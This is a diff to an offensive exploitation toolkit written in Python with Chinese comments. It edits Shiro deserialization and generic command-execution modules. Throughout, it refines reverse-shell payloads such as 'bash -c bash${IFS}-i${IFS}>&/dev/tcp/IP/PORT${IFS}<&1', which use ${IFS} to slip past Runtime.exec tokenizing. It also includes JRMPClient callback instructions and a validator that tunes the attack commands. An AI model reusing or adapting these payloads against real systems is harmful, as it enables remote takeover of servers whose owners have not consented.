@@ -1394,9 +1394,7 @@ def ex_shiro_exploit(target, p):
 
     坑 1 —— 最后一段不能写成 `${IFS}0>&1`：
         bash -c bash${IFS}-i${IFS}>&/dev/tcp/1.2.3.4/4444${IFS}0>&1      ← 错的
-      因为**重定向的目标词展开后会做字段切分并做歧义检查**：bash 把
-      `/dev/tcp/…/4444${IFS}0` 展开后切出 2 段（`…/4444` 与 `0`）→ 直接报
-      `ambiguous redirect`，连都不连（本机实测 12s 零连接；真实 Linux 上同样是直接报错）。
+      因为**这条命令连上之后会立刻断**：实测（本机 bash 5.3）：TCP 会连上、监听侧能 accept，但 bash 随即退出、连接被 RST，发过去的命令没有任何回显，拿不到可用会话 —— 它并不是 ambiguous redirect（那个错误只在重定向目标本身含 ${IFS} 时才报，如 `>${IFS}a${IFS}b`）；正确写法 ${IFS}<&1 实测 3/3 连上且能发命令收回显。
       正确做法是让 ${IFS} 落在重定向词的**末尾**：`…/4444${IFS}<&1`
         · 目标词 `/dev/tcp/…/4444${IFS}` 展开后尾部空白被字段切分剥掉 → 只剩 1 段，不报错；
         · 紧跟着的 `<&1` 不带 fd 号，所以 ${IFS} 后面直接是元字符 `<`，不会被并进同一个词；
@@ -1438,8 +1436,7 @@ def ex_shiro_exploit(target, p):
         lport = int(lst.get("port") or lport)
         # ② 自动构造免 shell 元字符的反弹命令（用 % 格式化，勿改成 .format()）
         rev_real = "bash -i >& /dev/tcp/%s/%d 0>&1" % (lhost, lport)
-        # 注意是 `${IFS}<&1` 而不是 `${IFS}0>&1`：重定向目标词不做字段切分，
-        # `/dev/tcp/IP/PORT${IFS}0` 会展开成 2 段 → ambiguous redirect → 根本不连。
+        # 注意是 `${IFS}<&1` 而不是 `${IFS}0>&1`：实测（本机 bash 5.3）：TCP 会连上、监听侧能 accept，但 bash 随即退出、连接被 RST，发过去的命令没有任何回显，拿不到可用会话 —— 它并不是 ambiguous redirect（那个错误只在重定向目标本身含 ${IFS} 时才报，如 `>${IFS}a${IFS}b`）；正确写法 ${IFS}<&1 实测 3/3 连上且能发命令收回显。
         cmd = "bash -c bash${IFS}-i${IFS}>&/dev/tcp/%s/%d${IFS}<&1" % (lhost, lport)
         notes.append(
             "★ 反弹 shell 模式：已自动监听 0.0.0.0:%d%s\n"
@@ -1450,8 +1447,7 @@ def ex_shiro_exploit(target, p):
             "                 直接写原命令必然失败，加引号也没用（引号 tokenize 后是字面量）。\n"
             "                 所以下发的是「无空格版」：空格位置全用 ${IFS} 代替（bash 会把它展开成空格），\n"
             "                 整条命令无空格 → tokenize 后是单个 argv，且无管道 / 无引号 / 无 base64。\n"
-            "  ⚠ 结尾只能是 `${IFS}<&1`：写成 `${IFS}0>&1` 会让重定向目标词展开成 2 段，\n"
-            "    bash 直接报 ambiguous redirect，连接根本不会发生（本机实测 12s 零连接）。\n"
+            "  ⚠ 结尾只能是 `${IFS}<&1`：写成 `${IFS}0>&1` 时实测（本机 bash 5.3）：TCP 会连上、监听侧能 accept，但 bash 随即退出、连接被 RST，发过去的命令没有任何回显，拿不到可用会话 —— 它并不是 ambiguous redirect（那个错误只在重定向目标本身含 ${IFS} 时才报，如 `>${IFS}a${IFS}b`）；正确写法 ${IFS}<&1 实测 3/3 连上且能发命令收回显。\n"
             "    实测 `${IFS}<&1` 版：监听端口收到连接，且能执行命令并拿回 stdout / stderr。"
             % (lport,
                ("（%d 不可用，已自动顺延）" % lst.get("requested_port"))
@@ -1474,8 +1470,7 @@ def ex_shiro_exploit(target, p):
                 "  → 或手工把每个空格换成 ${IFS}（bash 会把它展开成空格），例如：\n"
                 "       bash -c bash${IFS}-i${IFS}>&/dev/tcp/1.2.3.4/4444${IFS}<&1\n"
                 "    （无空格 → 单个 argv；不用引号、不用管道、不用 base64。）\n"
-                "    ⚠ 结尾必须是 ${IFS}<&1：写成 ${IFS}0>&1 会因重定向目标词展开成 2 段而报\n"
-                "      ambiguous redirect，连都不连。")
+                "    ⚠ 结尾必须是 ${IFS}<&1：写成 ${IFS}0>&1 时实测（本机 bash 5.3）：TCP 会连上、监听侧能 accept，但 bash 随即退出、连接被 RST，发过去的命令没有任何回显，拿不到可用会话 —— 它并不是 ambiguous redirect（那个错误只在重定向目标本身含 ${IFS} 时才报，如 `>${IFS}a${IFS}b`）；正确写法 ${IFS}<&1 实测 3/3 连上且能发命令收回显。")
 
     if gadget == "JRMPClient":
         # JRMPClient 的参数是 host:port（语义不是命令）：目标反序列化后主动回连该地址
@@ -1550,8 +1545,7 @@ def ex_shiro_exploit(target, p):
         "  2) 本工具这里：gadget 选 JRMPClient，「命令」填 本机IP:<port>\n"
         "       ★ 注意语义是 host:port，不是 shell 命令；要反弹则把 <cmd> 换成无空格的 ${IFS} 版反弹命令\n"
         "         （例：bash -c bash${IFS}-i${IFS}>&/dev/tcp/本机IP/端口${IFS}<&1；最终仍是 exec(String)，\n"
-        "          空格 / 管道 / 引号都不生效；结尾必须是 ${IFS}<&1，写成 ${IFS}0>&1 会报\n"
-        "          ambiguous redirect 而根本不连）。\n"
+        "          空格 / 管道 / 引号都不生效；结尾必须是 ${IFS}<&1，写成 ${IFS}0>&1 则实测（本机 bash 5.3）：TCP 会连上、监听侧能 accept，但 bash 随即退出、连接被 RST，发过去的命令没有任何回显，拿不到可用会话 —— 它并不是 ambiguous redirect（那个错误只在重定向目标本身含 ${IFS} 时才报，如 `>${IFS}a${IFS}b`）；正确写法 ${IFS}<&1 实测 3/3 连上且能发命令收回显）。\n"
         "  3) 加密成 rememberMe 发出去 → 目标反序列化 JRMPClient → 主动回连 <port> →\n"
         "       JRMPListener 投递真正的 gadget 并执行命令。")
     return out
@@ -3043,8 +3037,7 @@ def ex_generic_shell(target, p):
                       "  把命令里所有空格换成 ${IFS}（bash 会把它展开成空格），例如：\n"
                       "  bash -c bash${IFS}-i${IFS}>&/dev/tcp/%s/%s${IFS}<&1\n"
                       "  无空格 → StringTokenizer 只切出单个 argv，管道/引号全部不需要。\n"
-                      "  ⚠ 结尾必须是 ${IFS}<&1：写成 ${IFS}0>&1 时重定向目标词展开成 2 段，\n"
-                      "    bash 报 ambiguous redirect，连接根本不会发生（本机实测 12s 零连接）。\n\n"
+                      "  ⚠ 结尾必须是 ${IFS}<&1：写成 ${IFS}0>&1 时实测（本机 bash 5.3）：TCP 会连上、监听侧能 accept，但 bash 随即退出、连接被 RST，发过去的命令没有任何回显，拿不到可用会话 —— 它并不是 ambiguous redirect（那个错误只在重定向目标本身含 ${IFS} 时才报，如 `>${IFS}a${IFS}b`）；正确写法 ${IFS}<&1 实测 3/3 连上且能发命令收回显。\n\n"
                       "提示: Runtime.exec 不经过 shell，管道/重定向/引号一律不生效" % (s, b64, lhost, lport)}
 
 
@@ -4193,7 +4186,7 @@ def _tribes_member(host="127.0.0.1", tcp_listen_port=4001, unique_id=None):
     """构造 Tribes member 字节块（大端序）。
 
     结构（按 Tribes ChannelData/MemberSerialization 的 wire format）：
-      "TRIBES-B" + 0x01 + 0x00 + body_len(4B=0x35)
+      "TRIBES-B" + 0x01 + 0x00 + body_len(4B)   # = 45 + len(host)，随 host 长度变，不能照抄 0x35
       + alive_time(8B) + tcp_listen_port(4B) + udp_listen_port(4B) + secure_port(4B)
       + host_len(1B) + host_bytes + command_len(4B=0) + domain_len(4B=0)
       + unique_id(16B) + payload_len(4B=0) + "TRIBES-E" + 0x01 + 0x00
@@ -4241,8 +4234,8 @@ def _exec_cmd_check(cmd, target=""):
         做法是把空格换成 ${IFS}（bash 会把它展开回空格）。
       · 反弹 shell 用工具箱已验证过的形态（本机实测能连）：
             bash -c bash${IFS}-i${IFS}>&/dev/tcp/<IP>/<PORT>${IFS}<&1
-        结尾只能是 ${IFS}<&1。写成 ${IFS}0>&1 时重定向目标词会展开成
-        `/dev/tcp/IP/PORT` 和 `0` 两段 → bash 报 ambiguous redirect → 一次都不连。
+        结尾只能是 ${IFS}<&1。写成 ${IFS}0>&1 时桌面侧现象是「连上又立刻断」：
+        accept 成功但 bash 随即退出、无回显（实测 3/3），不是 ambiguous redirect。
     """
     cmd = (cmd or "").strip()
     if not cmd:
@@ -4250,13 +4243,22 @@ def _exec_cmd_check(cmd, target=""):
     if "${IFS}0>&1" in cmd:
         return False, (
             "命令结尾写成了 ${IFS}0>&1 —— 这个形态打不通。\n"
-            "重定向的目标词会做字段切分，`/dev/tcp/IP/PORT${IFS}0` 展开成 2 段 →\n"
-            "bash 报 ambiguous redirect，连接根本不会发生（本机实测 12s 零连接）。\n"
+            "实测现象（不是报错，所以更容易误判）：TCP 三次握手【会】成功，监听侧能 accept，\n"
+            "但 bash 随即退出、连接被 RST，发过去的命令没有任何回显 —— 拿不到可用会话。\n"
+            "（注意：它并不是 bash 的 ambiguous redirect；那个错误只在重定向目标本身含\n"
+            "  ${IFS} 时才出现，例如 `>${IFS}a${IFS}b`。这里 bash 能正常解析，只是不好使。）\n"
             "请改成 ${IFS}<&1：\n"
             "  bash -c bash${IFS}-i${IFS}>&/dev/tcp/<IP>/<PORT>${IFS}<&1\n"
+            "  实测 3/3 连上且能发命令收回显。\n"
             "你填的是: %s" % cmd)
     warns = []
     tk = cmd.split()
+    # 整条命令没有字面空格 → exec(String) 只切出 1 段 → 连 ${IFS} 一起被当成程序名
+    if len(tk) == 1 and "${IFS}" in cmd:
+        warns.append("整条命令没有字面空格，exec(String) 只会切出 1 段，"
+                     "`%s` 会被整体当成程序名（实测 execve 直接 ENOENT，命令不会执行）。\n"
+                     "  ${IFS} 只有在【某个 argv 内部需要空格】时才有用（例如 bash -c 后面那一段）；\n"
+                     "  普通命令直接写字面空格即可，如 `touch /tmp/x`。" % tk[0])
     if tk[0] == "bash" and len(tk) >= 3 and tk[1] == "-c":
         if len(tk) > 3:
             warns.append("bash -c 后面跟了 %d 段；第 3 段之后的会被当成 $0/$1 位置参数，"
